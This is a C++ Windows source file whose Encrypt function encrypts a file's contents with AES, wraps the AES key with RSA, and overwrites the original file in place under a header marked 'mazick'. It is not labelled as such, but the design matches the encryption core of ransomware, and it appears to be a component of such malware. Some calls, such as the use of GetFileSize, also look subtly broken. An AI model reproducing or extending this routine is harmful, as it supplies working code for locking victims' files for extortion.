#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <conio.h>
#include "Cryptor.h"
#include "AES.h"
#include "RSA.h"



#define RSA_BLOCK_SIZE 256

cryptor::encryptComponent encrypt_component;
cryptor::encryptHeader encrypt_header;
AES::AEScomponent aes_component;
RSA::RSAcomponent rsa_component;



void cryptor::Encrypt(BYTE *filePath)
{
	AES::AESInit(aes_component.provider, aes_component.keyAES, aes_component.keyLen, aes_component.keyBlobAES);
	encrypt_component.hFile1 = CreateFileA((LPSTR)filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	encrypt_component.dwFileSize = GetFileSize(encrypt_component.hFile1, &encrypt_component.dwFileSize);
	encrypt_header.originalFileSize = encrypt_component.dwFileSize;

	//read data of original file to buffer 
	encrypt_component.buffer = (BYTE*)VirtualAlloc(NULL, encrypt_component.dwFileSize, MEM_COMMIT, PAGE_READWRITE);
	//auto aasdkjalksd = GetLastError();
	//encrypt_component.buffer = (BYTE *)calloc(encrypt_component.dwFileSize, 1);

	ReadFile(encrypt_component.hFile1, encrypt_component.buffer, encrypt_component.dwFileSize, &encrypt_component.dwFileSize, NULL);
	CloseHandle(encrypt_component.hFile1);

	//reopen file so that enrypt data not concat to original data 
	encrypt_component.hFile1 = CreateFileA((LPSTR)filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);


	//encrypt data with AES key
	DWORD tempSize = encrypt_component.dwFileSize;
	if (!CryptEncrypt(aes_component.keyAES, 0, TRUE, 0, NULL, &encrypt_component.dwFileSize, 0))
	{
		VirtualFree(encrypt_component.buffer, encrypt_component.dwFileSize, MEM_DECOMMIT);
		//free(encrypt_component.buffer);
		CryptDestroyKey(aes_component.keyAES);
		return;
	}
	if (!CryptEncrypt(aes_component.keyAES, 0, TRUE, 0, encrypt_component.buffer, &tempSize, encrypt_component.dwFileSize))
	{
		VirtualFree(encrypt_component.buffer, encrypt_component.dwFileSize, MEM_DECOMMIT);
		//free(encrypt_component.buffer);
		CryptDestroyKey(aes_component.keyAES);
		return;
	}


	//encrypt AES key using RSA key
	RSA::EncryptRSA(aes_component.keyBlobAES);


	//Write header to encrypt File
	//-----------------------------------------------------------------------------------------------------------------------------------
	BYTE bufferSize[MAXBYTE];
	DWORD Size = sizeof(DWORD);
	DWORD magicSize = strlen("mazick") + 1;
	//magic
	memcpy(encrypt_header.magic, "mazick", strlen("mazick"));
	WriteFile(encrypt_component.hFile1, encrypt_header.magic, magicSize, &magicSize, NULL);
	//key AES size 
	_itoa(aes_component.keyLen, (char*)bufferSize, 16);
	WriteFile(encrypt_component.hFile1, bufferSize, Size, &Size, NULL);
	//key AES encrypt
	WriteFile(encrypt_component.hFile1, aes_component.keyBlobAES, RSA_BLOCK_SIZE, &aes_component.keyLen, NULL);
	//original file size
	_itoa(encrypt_header.originalFileSize, (char*)bufferSize, 16);
	WriteFile(encrypt_component.hFile1, bufferSize, Size, &Size, NULL);
	//-----------------------------------------------------------------------------------------------------------------------------------


	//Write encrypt data to original file
	WriteFile(encrypt_component.hFile1, encrypt_component.buffer, encrypt_component.dwFileSize, &encrypt_component.dwFileSize, NULL);
	CloseHandle(encrypt_component.hFile1);
	VirtualFree(encrypt_component.buffer, encrypt_component.dwFileSize, MEM_DECOMMIT);
	//free(encrypt_component.buffer);

	return;
}
